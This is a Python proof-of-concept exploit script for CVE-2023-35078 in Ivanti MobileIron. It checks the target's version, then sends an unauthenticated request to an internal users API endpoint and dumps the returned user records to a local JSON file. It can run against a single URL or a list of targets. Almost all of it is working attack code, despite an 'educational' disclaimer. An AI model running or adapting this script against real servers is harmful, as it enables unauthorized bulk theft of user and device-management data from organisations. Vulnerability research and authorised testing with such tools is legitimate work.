import requests
import sys
import json
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from termcolor import colored

def banner():
    print("""
          
██████╗ ███╗   ██╗███████╗███████╗ ██████╗
██╔═████╗████╗  ██║██╔════╝██╔════╝██╔════╝
██║██╔██║██╔██╗ ██║███████╗█████╗  ██║     
████╔╝██║██║╚██╗██║╚════██║██╔══╝  ██║     
╚██████╔╝██║ ╚████║███████║███████╗╚██████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝
 
[+] Description:
This script demonstrates an ethical Proof of Concept (PoC) for CVE-2023-35078 - Remote Unauthenticated API Access Vulnerability
The vulnerability allows unauthorized access to sensitive data through an insecure API endpoint.
https://nvd.nist.gov/vuln/detail/CVE-2023-35078

[+] Disclaimer:
This script is for educational and ethical purposes only. It should only be used with explicit permission from the system owner and for legitimate security testing.

[+] Usage:
python cve_2023_35078.py -u http://
python cve_2023_35078.py -f urls.txt

[+] Author:
0nsec (https://github.com/0nsec)
""")

def check_ivanti_mobileiron_version(url):
    # Check if the target is vulnerable
    # Checking version from the HTML <link href="https://[target]/mifs/css/ui.login.css?11.2" rel="stylesheet" type="text/css" />
    
    # Get the HTML
    try:
        r = requests.get(url, verify=False)
        if r.status_code == 200:
            # Get the version from the HTML
            version_start = r.text.find("ui.login.css?")
            if version_start != -1:
                version_end = r.text.find('"', version_start)
                version = r.text[version_start + len("ui.login.css?"):version_end]
                print(f"[*] Target version: {version}")
                if version <= "11.4":
                    print(colored("[+] Target is vulnerable!", "red"))
                    return True
                else:
                    print(colored("[-] Target is not vulnerable!", "red"))
                    return False
            else:
                print(colored("[-] Target is not vulnerable!", "red"))
        else:
            print(colored("[-] Target is not vulnerable!", "red"))
    except Exception as e:
        print(f"[-] Error occurred: {str(e)}")

def get_users(url):
    vuln_url = url + "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"
    print(f"[*] Exploiting the target... {url}")
    try:
        r = requests.get(vuln_url, verify=False)
        if r.status_code == 200:
            print(colored("[+] Extracting Data:", "red"))
            print(f"[*] Dumping all users from {vuln_url}")
            # Save JSON response to a file with 'utf-8' encoding
            # Create a file name withthe target URL
            filename = url.split("//")[1].split("/")[0] + ".json"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(r.text)
            print(colored("[+] Data saved to file: " + filename, "red"))
            print(colored("[+] Vulnerability Exploited Successfully!", "red"))
            print("")
        else:
            print(colored("[-] Exploit failed. The target is not vulnerable.", "red"))
    except Exception as e:
        print(f"[-] Error occurred: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='[+] CVE-2023-35078 - Remote Unauthenticated API Access Vulnerability Exploit POC')
    parser.add_argument('-u', '--url', help='URL to exploit', required=False)
    parser.add_argument('-f', '--file', help='File containing URLs', required=False)
    args = parser.parse_args()
    banner()
    if args.file:
        print(colored("[*] Reading URLs from file...", "red"))
        with open(args.file, "r") as f:
            urls = f.readlines()
            for url in urls:
                try:
                    # ignore empty lines
                    if url == "\n":
                        continue
                    url = url.strip()
                    print(f"[*] Target: {url}")
                    is_vulnerable = check_ivanti_mobileiron_version(url)
                    if is_vulnerable:
                        get_users(url)
                except Exception as e:
                    continue
    elif args.url:
        print(f"[*] Target: {args.url}")
        is_vulnerable = check_ivanti_mobileiron_version(args.url)
        if is_vulnerable:
            get_users(args.url)

if __name__ == "__main__":
    main()
